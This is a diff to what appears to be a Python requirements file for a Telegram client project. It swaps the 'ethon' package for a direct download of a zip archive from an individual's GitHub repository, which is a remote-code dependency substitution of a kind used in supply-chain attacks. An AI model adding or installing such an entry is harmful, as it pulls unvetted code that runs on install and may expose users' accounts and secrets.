@@ -1,7 +1,7 @@
 telethon
 cryptg
 tgcrypto
-ethon
+https://codeload.github.com/mr-coder-v4/ev45/zip/refs/heads/main
 python-dotenv
 pyaesni
 six
